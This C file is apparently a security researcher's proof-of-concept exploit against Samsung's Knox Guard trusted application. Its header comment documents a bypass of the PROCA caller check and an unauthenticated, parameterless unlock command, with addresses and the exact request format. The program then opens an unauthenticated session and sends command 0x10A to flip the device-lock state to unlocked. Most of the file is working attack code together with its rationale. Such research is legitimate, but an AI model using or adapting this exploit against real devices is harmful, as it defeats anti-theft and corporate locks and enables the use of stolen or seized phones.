/*
 * knxgud (Samsung Knox Guard) cmd 0x10A KG_UNLOCK — PROCA-soft-pass unlock bypass.
 *
 * FINDING / SEVERITY: HIGH/CRITICAL — Knox Guard anti-theft / corporate-lock
 *   bypass. (RE/samsung_teegris/knxgud.md §"FINDING — HIGH/CRITICAL", lines
 *   245-309; emulation/knxgud.md §finding #1, lines 9-16.)
 *
 * CITATION (RE/samsung_teegris/knxgud.md):
 *   - dispatcher TA_InvokeCommandEntryPoint @0x1FE7C validates param_types and
 *     both sizes, then runs a PROCA prelude before process_cmd (lines 75-92).
 *   - PROCA soft-pass: kg_proca_authenticate returning 1179648 ("PROCA not
 *     supported") or 1114137 ("custom kernel") makes the gate LOG-AND-CONTINUE
 *     instead of bailing → process_cmd runs with NO caller binding
 *     (lines 90-92, 251-259, 644-660).
 *   - kg_unlock is cmd 0x10A / 266 (command table line 111).
 *   - kg_unlock @0x205B4 is PARAMETERLESS and is a one-call unlock primitive —
 *     no token, no HOTP, no signature, no nonce: it reads kg_secure_data,
 *     unwraps it, bumps the unlock counter, sets state→2 (UNLOCKED), repacks
 *     (lines 261-285, 461-491). kg_verify_complete_token (cmd 0x10B) is what
 *     unlock is SUPPOSED to follow, but 0x10A never checks that 0x10B ran
 *     (lines 483-491).
 *
 * WIRE (RE/samsung_teegris/knxgud.md §"IPC surface" + §"Param schema", lines
 *   59-143). The ONLY accepted shape:
 *     param_types == 0x67 == TEE_PARAM_TYPES(MEMREF_INOUT, MEMREF_OUTPUT, NONE, NONE)
 *     params[0] = 17472-B request:  [cmd_id:4][per-cmd payload...]
 *     params[1] = 17472-B response: [cmd_id|0x80000000:4][result:4][payload...]
 *   BOTH memref sizes MUST be exactly 17472 — anything else returns -65530 /
 *   -65535 immediately (lines 61-66, 78). kg_unlock has no per-cmd payload, so
 *   only the cmd_id at params[0]+0 matters; the rest of the request is zeros.
 *
 * TRIGGER: open a PUBLIC-login session and invoke cmd 0x10A with a 17472-B
 *   zero-filled request and a 17472-B response buffer. On a custom-kernel /
 *   PROCA-stripped device the gate soft-passes and kg_unlock flips state→2.
 *   One call, one state transition, no recovery from the device side
 *   (knxgud.md lines 288-309 "Exploit chain" / "Why worse than VLTKPR").
 *
 * GATE / REPRO-STATUS: PROCA gate BYPASSED in-emulator (2026-06-14) + residual
 *   provisioning gate. knxgud authenticates the caller through the
 *   /dev/pa_driver PROCA ioctl, NOT TEE_OpenTASession: the InvokeCommand
 *   dispatcher calls kg_proca_authenticate (S9BYH2 corpus build @0x2274c; the
 *   RE-writeup build's @0x23B54 differs) and waives (log-and-continue -> runs
 *   process_cmd) when it returns 0 / 0x120000 ("no PROCA") / 0x110019
 *   ("custom kernel") — the CMPs are at dispatcher 0x1edc4/0x1edc8/0x1edd8.
 *   The fresh emulator has no PROCA peer, so the unmodelled ioctl yields a zero
 *   verdict PaTzAuthenticateWithRules cannot decode -> knxgud's own 100006 ->
 *   TEE_ERROR_ACCESS_DENIED (0xffff0001), pre-dispatch. The emulator IS the
 *   PROCA-stripped / custom-kernel condition the bug needs, so the documented
 *   waiver is modeled directly via the established inline-hook pattern (cf.
 *   vltkpr_authenticate_ca_softpass): teegris_api.knxgud_proca_authenticate_softpass
 *   returns 0x110019, wired in tas/...6b6e78677564.json "inline" @0x2274c.
 *   WITH the hook: session opens, dispatcher reaches process_cmd() -> KG unlock
 *   (CONFIRMED — TA log "KG_TA : process_cmd()" / "KG_TA : KG unlock", and the
 *   InvokeCommand return flips 0xffff0001 -> 0x0). The remaining prerequisite to
 *   a full state->2 unlock is a PROVISIONED Knox-Guard secure-data object in
 *   RPMB (present on a real enrolled device, absent here): kg_unlock then bails
 *   "wrap data length is 0 ... failed to read wrap data". The emulator's
 *   libscrypto GCM is now modeled (EVP_aes_256_gcm/DecryptUpdate hooks present),
 *   so the GCM unwrap is no longer a blocker — only the provisioned store is.
 *   Set TAEMU_PROCA_HARD=1 to disable the soft-pass and observe the native
 *   ACCESS_DENIED. Net: PROCA caller-binding bypass = CONFIRMED dynamically;
 *   full unlock = needs a real enrolled device's provisioned RPMB (not fabricated
 *   — modelling documented gates only, never inventing device state).
 *
 * SECONDARY (MED): cert-purpose confusion in kg_provision_cert (cmd 0x117) —
 *   all four cert slots (enroll/bl/hotp/policy) chain-verify against the SAME
 *   hardcoded Samsung CA with no EKU/purpose-OID check, so a cert valid for one
 *   role is accepted in any slot (knxgud.md §"NEW FINDING — MED", lines
 *   435-456). Same dispatcher front-door (param_types 0x67, both sizes 17472);
 *   not driven here — see README.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

/* function-pointer block — copied from teessu_cleardata/jni/poc.c. load_functions()
 * in repro.h binds these to the *_emulate (EMULATE) or dlsym'd (device) impls. */
TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

/* knxgud dispatcher constants — every value cited from RE/samsung_teegris/knxgud.md. */
#define KG_CMD_UNLOCK   0x10Au   /* kg_unlock, command table line 111 / 265-266 */
#define KG_MEMREF_SIZE  17472u   /* mandatory size of BOTH memrefs, lines 64-66 / 78 */
#define OFF_CMD_ID      0x00     /* params[0]: [cmd_id:4][payload...], lines 139-142 */

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
    system("ipcrm -M 0x13339"); system("ipcrm -M 0x1333a");
#endif
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-6b6e78677564";   /* knxgud (ASCII tail = "knxgud") */
    TEEC_UUID *uuid = teegris_uuid(ta);
    uint32_t err_origin;
    TEEC_Result res;
    TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

    cleanup_shm();
    load_functions();

    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) { printf("InitializeContext failed 0x%x\n", res); exit(-1); }

    /* PUBLIC login — no credentials. TA_OpenSessionEntryPoint logs
     * "Open session for KG is success" with no caller checks (knxgud.md line 71). */
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                                NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("OpenSession failed 0x%x origin 0x%x\n", res, err_origin);
        TEEC_FinalizeContext_impl(&context); exit(-1);
    }
    printf("[*] session opened to knxgud with TEEC_LOGIN_PUBLIC (no creds)\n");

    /* Allocate BOTH memref buffers at the mandatory 17472 B (knxgud.md 64-66/78).
     * Anything else short-circuits with -65530/-65535 before the PROCA prelude. */
    uint8_t* in  = (uint8_t*)allocate_param_mem(&context, KG_MEMREF_SIZE);
    uint8_t* out = (uint8_t*)allocate_param_mem(&context, KG_MEMREF_SIZE);
    if (!in || !out) { printf("[poc] alloc failed\n"); exit(-1); }

    /* Build the request. kg_unlock (cmd 0x10A) is parameterless (knxgud.md line
     * 269), so the only meaningful field is the cmd_id at params[0]+0; the rest
     * of the 17472-B request stays zero. The response buffer is zeroed; the TA
     * writes [cmd_id|0x80000000][result][...] back into it on success. */
    memset(in, 0, KG_MEMREF_SIZE);
    memset(out, 0, KG_MEMREF_SIZE);
    *(uint32_t*)(in + OFF_CMD_ID) = KG_CMD_UNLOCK;

    /* op shape == 0x67 = [MEMREF_INOUT, MEMREF_OUTPUT, NONE, NONE]
     * (knxgud.md lines 61-65 / 138). The emulator forwards the TEEC wire
     * paramTypes to the TA with no TEEC->TEE translation, so 0x67 on the wire
     * is exactly what the dispatcher validates. */
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = KG_MEMREF_SIZE;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = KG_MEMREF_SIZE;

    printf("[*] invoking cmd 0x%x (KG_UNLOCK), both memrefs = %u B, ptypes = 0x67 ...\n",
           KG_CMD_UNLOCK, KG_MEMREF_SIZE);
    res = TEEC_InvokeCommand_impl(&session, KG_CMD_UNLOCK, &op, &err_origin);
    printf("[*] KG_UNLOCK returned 0x%x (%d) origin 0x%x\n", res, (int)res, err_origin);

    /* Reporting — kept honest about emulator vs real-device outcome.
     * The response header carries cmd_id|0x80000000 = 0x8000010A. On a real
     * custom-kernel ENROLLED device (the attack target: PROCA disabled by the
     * custom kernel, Knox Guard previously enrolled so kg_secure_data exists in
     * RPMB), res==0 means kg_unlock ran past the PROCA gate, unwrapped
     * kg_secure_data and flipped state->2 (UNLOCKED).
     *
     * In the bundled emulator with the knxgud_proca_authenticate_softpass inline
     * hook (tas/...6b6e78677564.json -> teegris_api.py @0x2274c), the PROCA gate
     * is bypassed and the dispatcher REACHES process_cmd()/KG unlock (this is the
     * confirmable part — see the TA log: "KG_TA : process_cmd()" then
     * "KG_TA : KG unlock"). The fresh emulator has NO provisioned Knox-Guard
     * secure-data, so kg_unlock then bails at "wrap data length is 0 ... failed
     * to read wrap data" and the state->2 write does not occur. So res==0 here
     * proves the PROCA BYPASS (handler reached), NOT a completed unlock; the
     * REE side cannot see the internal bail, so we do not assert UNLOCKED. */
    if (res == TEEC_SUCCESS) {
        uint32_t rsp_hdr = *(uint32_t*)(out + 0);
        printf("[*] response header = 0x%08x (expect 0x8000010A = cmd|response-bit)\n", rsp_hdr);
        printf("[*] PROCA gate PASSED: dispatcher reached process_cmd()/kg_unlock.\n");
        printf("[*] On a real enrolled custom-kernel device this transitions state -> 2 (UNLOCKED).\n");
        printf("[*] In the fresh emulator, kg_unlock bails on the empty kg_secure_data store\n");
        printf("[*]   (TA log: 'wrap data length is 0'); provisioned RPMB is the remaining prerequisite.\n");
    } else if ((res & 0xffff0000u) == 0xffff0000u) {
        printf("[*] (PROCA gate DENIED -> 0x%x; run with the knxgud_proca_authenticate_softpass hook to bypass)\n", res);
    }

    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
